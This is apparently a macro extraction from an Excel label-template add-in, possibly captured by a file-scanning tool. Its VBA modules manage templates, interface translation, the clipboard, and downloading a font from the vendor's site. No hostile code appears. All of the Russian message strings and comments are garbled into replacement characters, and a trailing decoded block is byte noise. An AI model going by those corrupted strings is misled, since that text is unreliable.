    Application.DisplayAlerts = False
    If sh.Name <> SheetName$ Then
        For Each S In sh.Parent.Worksheets
            If S.Name = SheetName$ Then S.Delete
        Next S
        sh.Name = SheetName$
    End If
    sh.Parent.Close True
    Application.DisplayAlerts = True
End Sub


Function GetTemplateRange(ByRef sh As Worksheet, Optional HideMessages As Boolean) As Range
    On Error Resume Next
    Dim RangeAddress$
    RangeAddress$ = Replace(Replace(sh.Name, "-", ":"), " ", "")
    Set GetTemplateRange = sh.Range(RangeAddress$)
    If GetTemplateRange Is Nothing Then
        Set GetTemplateRange = sh.UsedRange
        If GetTemplateRange.Rows.Count > 1000 Then Set GetTemplateRange = Nothing
        If GetTemplateRange.Columns.Count > 200 Then Set GetTemplateRange = Nothing
    End If
    If GetTemplateRange Is Nothing Then
        If Not HideMessages Then
            MsgBox "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
                   "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|", vbCritical
        End If
    End If
End Function

Function LoadActiveTemplate(Optional Visible As Boolean) As Worksheet
    On Error Resume Next
    Dim filename$, WB As Workbook
    If Not CURRENT_TEMPLATE$ Like "*.xls*" Then
        MsgBox "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|", vbCritical, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        End
    End If
    filename$ = TEMPLATES_FOLDER$ & CURRENT_TEMPLATE$
    If Not FWF.FileExists(filename$) Then
        MsgBox "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & CURRENT_TEMPLATE$ & " |fffd| |fffd||fffd||fffd||fffd||fffd| " & TEMPLATES_FOLDER$, vbCritical
        Exit Function
    End If

    Set WB = GetObject(filename$)
    If WB Is Nothing Then
        MsgBox "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & CURRENT_TEMPLATE$ & " |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| " & TEMPLATES_FOLDER$, vbCritical
        Exit Function
    End If
    WB.Windows(1).Visible = Visible
    Set LoadActiveTemplate = WB.Worksheets(1)
End Function

Sub CreateTemplateSamplesOnFirstRun()
    On Error Resume Next
    Dim NewName$, filename$, WB As Workbook, sh As Worksheet, n&

    Application.ScreenUpdating = False
    Application.DisplayAlerts = False
    For Each sh In ThisWorkbook.Worksheets
        If sh.CodeName Like "template*" Then
            If ActiveWorkbook Is Nothing Then Set WB = ThisWorkbook Else Set WB = ActiveWorkbook
            sh.Copy
            If Not ActiveWorkbook Is Nothing Then
                If Not (ActiveWorkbook Is WB) Then
                    n = n + 1
                    ' template copying done successfully
                    'NewName$ = FWF.Replace_symbols(sh.Name) & ".xls"
                    NewName$ = "test " & n & ".xls"
                    ActiveWorkbook.CheckCompatibility = False

                    ActiveWorkbook.SaveAs TEMPLATES_FOLDER$ & NewName$, xlWorkbookNormal
                    ActiveWorkbook.Close False
                End If
            End If
        End If
    Next sh
    Application.DisplayAlerts = True
    UpdateAddinToolbar
    Application.ScreenUpdating = True
End Sub

Function GetNewTemplateName() As String
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    On Error Resume Next
    Dim msg$, NewFilename$, res As Variant, NewName$, OldFilename$
GetName:
    msg$ = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|." & vbNewLine & vbNewLine & _
           "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|."
    res = Application.InputBox(msg, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|", , , , , , 2)
    If VarType(res) = vbBoolean Then Exit Function
    NewName$ = CStr(res)
    If Trim(NewName$) = "" Then
        MsgBox "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|!", vbExclamation
        GoTo GetName
    End If

    NewName$ = FWF.Replace_symbols(NewName$)

    OldFilename$ = Dir(TEMPLATES_FOLDER$ & NewName$ & ".xls*", vbNormal)
    NewFilename$ = TEMPLATES_FOLDER$ & NewName$ & ".xls"
    If Len(OldFilename$) Then
        msg$ = "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd|" & NewName$ & "|fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
               "(|fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| " & OldFilename$ & ")" & vbNewLine & vbNewLine & _
               "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|."
        MsgBox msg, vbExclamation
        GoTo GetName
    End If

    GetNewTemplateName = NewName$
End Function

Sub InstallFont(ByVal FontName$)
    On Error Resume Next
    Dim FontsFolder$, NewFilename$, TempFilename$, URL$
    FontsFolder$ = CreateObject("WScript.Shell").SpecialFolders("Fonts") & "\"

    NewFilename$ = FontsFolder$ & FontName$
    MkDir FWF.temp_folder & "font\"
    TempFilename$ = FWF.temp_folder & "font\" & FontName$

    URL$ = "http://ExcelVBA.ru/resources/Labels/" & FontName$

    If Not FWF.FileExists(TempFilename$) Then
        If Not FWF.DownLoadFileFromURL(URL$, TempFilename$, True) Then GoTo ErrorInstallingFont
    End If
    If Not FWF.FileExists(TempFilename$) Then GoTo ErrorInstallingFont

    MsgBox "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| " & FontName$ & " (|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd|)" & vbNewLine & vbNewLine & _
           "|fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| Windows (|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd|):" & vbNewLine & FontsFolder$, vbInformation
    OpenFolder FontsFolder$
    ShowFile TempFilename$
    Exit Sub


    'FileCopy TempFilename$, NewFilename$
    'DoEvents
    'If Not FWF.FileExists(NewFilename$) Then GoTo ErrorInstallingFont

    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
    'CreateObject("WScript.Shell").Run "RunDll32.exe gdi32.dll,AddFontResourceA " & TempFilename$
    'CreateObject("WScript.Shell").Run "RunDll32.exe win32api.dll,AddFontResource " & TempFilename$

ErrorInstallingFont:

    MsgBox "|fffd||fffd||fffd||fffd||fffd||fffd|: |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| " & FontName$ & vbNewLine & vbNewLine & _
           "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| " & FontName$ & ", - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, " & _
           "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| Windows:" & vbNewLine & FontsFolder$, vbExclamation
    FollowHyperlink "http://ExcelVBA.ru/resources/Labels/"
    OpenFolder FontsFolder$
End Sub
Attribute VB_Name = "mod_SelectTemplate"
'---------------------------------------------------------------------------------------
' Module        : mod_SelectTemplate                    Version:
' Author        : Igor Vakhnenko                   Date: 10.06.2016
' Professional application development for Microsoft Excel
' http://ExcelVBA.ru/        info@excelvba.ru      Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Explicit: Option Compare Text: Option Private Module

Sub ChangeActiveTemplate_FromMenu()        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    On Error Resume Next: Dim TemplateName$
    TemplateName$ = Application.CommandBars.ActionControl.Text
    If TemplateName$ = CURRENT_TEMPLATE$ Then Exit Sub
    If TemplateName$ = ADD_NEW_TEMPLATE_TEXT$ Then
        CreateNewLabelTemplate
        Exit Sub
    End If
    CURRENT_TEMPLATE$ TemplateName$
    UpdateAddinToolbar
End Sub

Sub DeleteLabelTemplate()
    On Error Resume Next
    Dim msg$, filename$
    msg = "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd|" & CURRENT_TEMPLATE$ & "|fffd|?" & vbNewLine & "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
    If MsgBox(msg, vbQuestion + vbOKCancel + vbDefaultButton2, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|") = vbCancel Then Exit Sub
    
    filename$ = TEMPLATES_FOLDER$ & CURRENT_TEMPLATE$
    Workbooks(CURRENT_TEMPLATE$).Close False
    Kill filename$
    UpdateAddinToolbar
End Sub

Function CreateNewLabelTemplate() As Boolean
    On Error Resume Next
    Dim NewName$, filename$, WB As Workbook
    NewName$ = GetNewTemplateName
    If NewName$ = "" Then UpdateAddinToolbar: Exit Function
    NewName$ = NewName$ & ".xls"
    
    filename$ = TEMPLATES_FOLDER$ & NewName$
    Set WB = Application.Workbooks.Add(xlWBATWorksheet)
    WB.SaveAs filename$
    
    CURRENT_TEMPLATE$ NewName$
    CreateNewLabelTemplate = True
    UpdateAddinToolbar
End Function

Function ADD_NEW_TEMPLATE_TEXT$()
    ADD_NEW_TEMPLATE_TEXT$ = "<" & tt("ADD_NEW_TEMPLATE") & ">"
End Function

Function CURRENT_TEMPLATE$(Optional ByVal TemplateName$)
    On Error Resume Next
    If Len(Trim(TemplateName$)) Then SETT.SetText "ACTIVE_TEMPLATE", TemplateName$
    CURRENT_TEMPLATE$ = SETT.GetText("ACTIVE_TEMPLATE")
End Function

Function ActivateTemplate(ByVal TemplateName$) As Boolean
    On Error Resume Next
    CURRENT_TEMPLATE TemplateName$
    Dim combo As Object, i&
    Set combo = GetCommandBar(PROJECT_NAME).Controls(1)
    combo.ListIndex = 0
    For i = 1 To combo.ListCount
        If combo.list(i) = TemplateName$ Then combo.ListIndex = i: ActivateTemplate = True: Exit For
    Next i
End Function

Function TEMPLATES_FOLDER$(Optional ByVal ForTextbox As Boolean = False)
    On Error Resume Next
    Dim DefaultFolderName$, Folder$
    With SETT
        DefaultFolderName$ = .GetText("TEMPLATES_FOLDER", "Label Templates", "Setup")
        If Trim(DefaultFolderName$) = "" Then DefaultFolderName$ = "Label Templates"
        
        .AddDefaultValue "TextBox_PicturesFolder", ThisWorkbook.Path & "\" & DefaultFolderName$ & "\", , True
        Folder$ = .GetText("TextBox_PicturesFolder")
        If Dir(Folder$, vbDirectory) = "" Then MkDir Folder$
        If Dir(Folder$, vbDirectory) = "" Then
            Folder$ = ThisWorkbook.Path & "\" & DefaultFolderName$ & "\"
            .SetText "TextBox_PicturesFolder", Folder$
            MkDir Folder$
        End If
        TEMPLATES_FOLDER$ = Folder$
    End With
End Function


Attribute VB_Name = "mod_Translate"
'---------------------------------------------------------------------------------------
' Module        : mod_Translate                    Version: 2.2
' Author        : Igor Vakhnenko                   Date: 02.05.2016
' Professional application development for Microsoft Excel
' http://ExcelVBA.ru/        info@excelvba.ru      Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Private Module: Option Compare Text: Option Explicit
Public Const TRANSLATE_SHEET_FIRST_ROW& = 5, DEFAULT_LANGUAGE$ = "en"
Dim DoNotTranslate As Boolean

Function TR_DIC() As Dictionary
    Static objTRDIC As Dictionary
    If Not objTRDIC Is Nothing Then
        Set TR_DIC = objTRDIC: Exit Function
    Else
        Set objTRDIC = New Dictionary: objTRDIC.CompareMode = TextCompare
        PrepareTraslateDictionary
        Set TR_DIC = objTRDIC
    End If
End Function

Sub TranslateUserForm(ByRef UF As Object)
    If DoNotTranslate Then Exit Sub
    On Error Resume Next: Dim ctrl As MSForms.Control, fcaption$
    fcaption$ = tt(UF.Name & "_caption"): If Len(fcaption$) Then UF.Caption = fcaption$
    For Each ctrl In UF.Controls
        UpdateControl ctrl, UF.Name
    Next
End Sub

Sub UpdateControl(ByRef ctrl As Object, Optional ByVal ParentName$)
    On Error Resume Next
    Dim m_page As Object, ID$, res$
    If TypeName(ctrl) = "MultiPage" Then
        For Each m_page In ctrl.Pages
            UpdateControl m_page, ParentName$ & "\" & ctrl.Name
        Next
    Else
        ID$ = ParentName$ & IIf(ParentName$ <> "", "\", "") & ctrl.Name
        res$ = tt(ID$)
        If Len(res$) Then ctrl.Caption = res$

        If Len(ctrl.Tag) Then
            ID$ = "tag:" & ParentName$ & IIf(ParentName$ <> "", "\", "") & ctrl.Name
            res$ = tt(ID$)
            If Len(res$) Then ctrl.Tag = res$
        End If

        If Len(ctrl.ControlTipText) Then
            ID$ = "ControlTipText:" & ParentName$ & IIf(ParentName$ <> "", "\", "") & ctrl.Name
            res$ = tt(ID$)
            If Len(res$) Then ctrl.ControlTipText = res$
        End If
    End If
End Sub


' ===================== prepare translations ==========================
Private Sub loadInfo_UserForms()
    On Error Resume Next
    DoNotTranslate = True

    ' PrintWords UsageExample

    ' PrintWords F_FirstRun
    DoNotTranslate = False
End Sub

Private Sub PrintUserformNames()
    On Error Resume Next
    Dim VBComp As Object
    For Each VBComp In ThisWorkbook.VBProject.VBComponents
        If VBComp.Type = 3 Then Debug.Print VBComp.Name
    Next VBComp
End Sub

Sub PrintWords(ByRef UF As Object)
    On Error Resume Next
    shtr.Range("a" & shtr.Rows.Count).End(xlUp).Offset(2) = UF.Name & " controls"
    Dim ctrl As MSForms.Control
    For Each ctrl In UF.Controls
        AddControlInformation ctrl, UF.Name
    Next
End Sub

Sub AddControlInformation(ByRef ctrl As Object, Optional ByVal ParentName$)
    On Error Resume Next
    Dim cell As Range, m_page As Object, ID$
    If TypeName(ctrl) = "MultiPage" Then
        For Each m_page In ctrl.Pages
            AddControlInformation m_page, ParentName$ & "\" & ctrl.Name
        Next
    Else
        ID$ = ParentName$ & IIf(ParentName$ <> "", "\", "") & ctrl.Name
        Debug.Print ID$
        If Len(ctrl.Caption) Then
            Set cell = shtr.Range("a" & shtr.Rows.Count).End(xlUp).Offset(1)
            cell.Resize(, 2).Value = Array(ID$, ctrl.Caption)
        End If

        If Len(ctrl.Tag) Then
            If ctrl.Tag <> "ScrollCombo" Then
                Set cell = shtr.Range("a" & shtr.Rows.Count).End(xlUp).Offset(1)
                ID$ = "tag:" & ParentName$ & IIf(ParentName$ <> "", "\", "") & ctrl.Name
                cell.Resize(, 2).Value = Array(ID$, ctrl.Tag)
            End If
        End If

        If Len(ctrl.ControlTipText) Then
            Set cell = shtr.Range("a" & shtr.Rows.Count).End(xlUp).Offset(1)
            ID$ = "ControlTipText:" & ParentName$ & IIf(ParentName$ <> "", "\", "") & ctrl.Name
            cell.Resize(, 2).Value = Array(ID$, ctrl.ControlTipText)
        End If
    End If
End Sub

Function SYSTEM_LANGUAGE() As String
    On Error Resume Next
    Select Case Application.LanguageSettings.LanguageID(msoLanguageIDUI)
        Case 1049: SYSTEM_LANGUAGE = "ru"
        Case Else: SYSTEM_LANGUAGE = DEFAULT_LANGUAGE
    End Select
End Function

Function SetLanguage(ByVal new_lang_code$) As Boolean
    ' returns TRUE if language was changed (interface needs to be translated)
    On Error Resume Next
    Dim prev_lang_code$: prev_lang_code$ = GetLanguage
    SETT.SetText "Language", new_lang_code$, "Setup"

    SetLanguage = LCase(prev_lang_code$) <> LCase(new_lang_code$)
    If SetLanguage Then PrepareTraslateDictionary        ': CreateProgramCommandBar
End Function

Function GetLanguage() As String
    GetLanguage = SETT.GetText("Setup\Language", SYSTEM_LANGUAGE)
End Function

Function RUS() As Boolean
    RUS = SETT.GetText("Setup\Language", SYSTEM_LANGUAGE) = "ru"
End Function

Function tt(ByVal ID$, ParamArray tokens()) As String
    On Error Resume Next: Dim i&, AddSpaces As Boolean
    If ID$ Like "|??*" Then ID$ = SETT.U(Mid(ID$, 2))
    If ID$ Like " ?*" Then ID$ = Mid(ID$, 2): AddSpaces = True
    tt = TR_DIC.Item(ID$)
    If Not IsMissing(tokens) Then
        For i = LBound(tokens) To UBound(tokens)
            tt = Replace(tt, "!" & (i + 1), tokens(i))
        Next i
    End If
    tt = Replace(tt, "!add-in", PROJECT_NAME$)
    tt = Replace(tt, "/n", vbNewLine)
    If AddSpaces Then tt = " " & tt & " "
End Function

Function PrepareTraslateDictionary()
    On Error Resume Next: Err.Clear
    Dim ra As Range, KEYarr As Variant, VALarr As Variant, AvLangArr As Variant, col&, lang_code$, i&, K, v$
    Set ra = shtr.Range(shtr.Cells(TRANSLATE_SHEET_FIRST_ROW, 1), shtr.Range("A" & shtr.Rows.Count).End(xlUp))
    If ra.Row < TRANSLATE_SHEET_FIRST_ROW Then
        MsgBox "Translation sheet has no data", vbCritical, "Contact the developer"
        End
    End If

    lang_code$ = GetLanguage: AvLangArr = AvailableLanguagesArray(True)
    For i = LBound(AvLangArr) To UBound(AvLangArr)
        If LCase(AvLangArr(i, 1)) = LCase(lang_code$) Then col& = i: Exit For
    Next i

    If col& = 0 Then
        lang_code$ = DEFAULT_LANGUAGE
        For i = LBound(AvLangArr) To UBound(AvLangArr)
            If LCase(AvLangArr(i, 1)) = LCase(lang_code$) Then col& = i: Exit For
        Next i
    End If

    If col& = 0 Then
        MsgBox "Translation error: unsupported language |fffd|" & GetLanguage & "|fffd|", vbCritical, "Contact the developer"
        End
    End If

    KEYarr = ra.Value
    VALarr = ra.Offset(, col&).Value

    With TR_DIC
        .RemoveAll
        .CompareMode = TextCompare
        For i = LBound(KEYarr) To UBound(KEYarr)
            v$ = VALarr(i, 1)
            For Each K In Split(KEYarr(i, 1), "|")
                If Len(K) Then If Not .Exists(CStr(K)) Then .Item(CStr(K)) = v$
            Next K
        Next i
    End With
End Function

Function AvailableLanguagesArray(Optional FullList As Boolean = False) As Variant
    On Error Resume Next: Err.Clear
    Dim ra As Range, arr, res, i&, ii&, dic As New Dictionary, ind&, CurrLangPresentInList As Boolean, CurrLanguage$, CurrLanguageColumn&
    Set ra = shtr.Range(shtr.[b1], shtr.Range("z1").End(xlToLeft)).Resize(4)
    If Err Then
        MsgBox "Translation sheet is absent", vbCritical, "Contact the developer"
        End
    End If
    If ra.Column < 2 Then
        MsgBox "Translation sheet is blank", vbCritical, "Contact the developer"
        End
    End If

    If FullList Then
        AvailableLanguagesArray = Application.Transpose(ra.Value)
        Exit Function
    End If

    arr = ra.Value
    ind& = 0: dic.CompareMode = TextCompare: CurrLanguage$ = GetLanguage
    For ii = LBound(arr, 2) To UBound(arr, 2)
        If arr(1, ii) = CurrLanguage$ Then CurrLanguageColumn& = ii
        For i = LBound(arr, 2) To UBound(arr, 2)
            If Val(arr(4, i)) = ii Then
                ind& = ind& + 1: dic.Item(ind&) = i
                If arr(1, i) = CurrLanguage$ Then CurrLangPresentInList = True
            End If
        Next i
    Next ii
    If Not CurrLangPresentInList Then If CurrLanguageColumn& Then dic.Item(ind& + 1) = CurrLanguageColumn&

    If ind& = 0 Then
        MsgBox "Translation sheet error: can't find language indexes", vbCritical, "Contact the developer"
        End
    End If

    ReDim res(1 To dic.Count, 1 To 2)
    For i = LBound(res) To UBound(res)
        res(i, 1) = arr(1, dic.Item(i))
        res(i, 2) = arr(2, dic.Item(i))
    Next i

    AvailableLanguagesArray = res
    Set dic = Nothing
End Function

Sub OneMoreSettingsForm()
    SetLanguage "en"
    With New F_Settings
        .Show
    End With
End Sub

Sub TranslateWorkbook(ByRef WB As Workbook)
    On Error Resume Next:    Dim n As Name, txt$
    For Each n In WB.Names
        'Debug.Print n.Name & vbTab & n.RefersToRange.Value
        txt$ = tt(n.Name)
        If Len(txt) Then n.RefersToRange.Cells(1).Value = txt
    Next
End Sub

'Function TranslateHyperlink(ByVal URL$, Optional ByVal ForTip As Boolean = False) As String
'    On Error Resume Next
'    TranslateHyperlink = URL$
'    LangCode$ = GetLanguageCode$
'    If LangCode$ = "ru" Or LangCode$ = "" Then Exit Function
'    ' If ForTip Then TranslateHyperlink = "Translation of " & URL$: Exit Function
'    If ForTip Then TranslateHyperlink = "(Russian -> " & GetLanguage$ & ") " & URL$: Exit Function
'    TranslateHyperlink = "http://translate.google.com/translate?sl=ru&tl=" & LangCode$ & "&u=" & URLEncode(URL$)
'End Function

Attribute VB_Name = "shtr"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
'---------------------------------------------------------------------------------------
' Author        : Igor Vakhnenko                   Date: 08.01.2016
' Professional application development for Microsoft Excel
' http://ExcelVBA.ru/        info@excelvba.ru      Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Const prefix$ = "MENU"

Function NewTranslateID() As String
    On Error Resume Next
    Dim ra As Range, coll As New Collection
    Set ra = shtr.Range(shtr.Range("a" & TRANSLATE_SHEET_FIRST_ROW), shtr.Range("A" & shtr.Rows.Count).End(xlUp))
    arr = ra.Value
    For i = LBound(arr) To UBound(arr)
        coll.Add arr(i, 1), CStr(arr(i, 1))
    Next i

    For i = 1 To 1000
        Err.Clear: ID$ = prefix$ & "_" & Format(i, "0000")
        coll.Add ID$, ID$
        If Err = 0 Then NewTranslateID = ID$: Exit Function
    Next
    MsgBox "Can't create ID$", vbExclamation, "Function NewTranslateID()"
End Function

Function ClipboardText()
    With GetObject("New:{1C3B4210-F441-11CE-B9EA-00AA006B1A69}")
        .GetFromClipboard
        ClipboardText = .GetText
    End With
End Function

Sub SetClipboardText(ByVal txt$)
    With GetObject("New:{1C3B4210-F441-11CE-B9EA-00AA006B1A69}")
        .SetText txt$
        .PutInClipboard
    End With
End Sub

Private Sub Worksheet_BeforeDoubleClick(ByVal Target As Range, Cancel As Boolean)
    On Error Resume Next
    If Target.Column = 1 And Target.Cells.Count = 1 Then
        If Target <> "" Then Cancel = True: SetClipboardText "tt(""" & Target & """) "
    End If
End Sub

Attribute VB_Name = "template1"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Name = "template2"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True

' InQuest injected base64 decoded content
' jZ 	
' "{-jYT
' *'~*
' "{-jYKj
' Z'y7
' )e"r

INQUEST-PP=macro
